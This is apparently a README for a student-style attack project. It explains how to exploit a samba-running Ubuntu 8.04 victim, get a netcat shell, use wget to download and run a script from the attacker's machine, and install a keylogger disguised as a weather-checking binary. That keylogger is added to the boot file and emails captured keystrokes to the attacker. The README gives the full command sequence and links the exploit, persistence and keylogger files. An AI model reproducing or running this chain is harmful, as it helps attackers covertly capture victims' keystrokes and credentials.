- [run keylogger](exploit/run.sh)
- [add keylogger to boot file](exploit/rewriteBoot.sh)
- [keylogger](scripts/weather.py)
## Binary
[A seemingly checking weather keylogger binary](exploit/weather)
## Email
A temporary Email address is needed so that keylogger can send message back
## Virtual Machines

## Virtual Machines

### Attacker

- Linux based machine with python on it (Kali-Linux is recommended)
- Unix based machine

### Victim

- [Ubuntu 8.04 Desktop with samba installed](https://drive.google.com/file/d/1bCviB84Nn4B2H-JRrIk0tRF7tXcdrCtE/view?usp=sharing)

## How To Run

1. Turn on all three devices (both [attackers](#attacker) and [victim](#victim)). You donâ€™t need to login [victim](#victim), but you do need to login both [Kali-Linux and Server](#attacker).
2. In the [Kali-Linux](#attacker), copy all the bash script files and binary file into the same folder

    ```bash
    > ls # should see only 4 files
    exploit.sh rewriteBoot.sh  run.sh weather
    ```

3. Start attack by:

    ```bash
    chmod +x exploit.sh # give permission
    ./exploit.sh <Target IP> <Kali-Linux IP> # run exploit script
    ```

   Give it seconds, if nothing showing after typing the command, give it another try.

4. Inside the netcat shell:

    ```bash
    wget http://<Kali-Linux IP>:8564/run.sh
    chmod +x run.sh
    ./run.sh <Kali-Linux IP> <Email Address> <Server IP>
    ```

   Terminate the process after a few second. You need to type CRTL+C twice. One for the NetCat one for the http server.
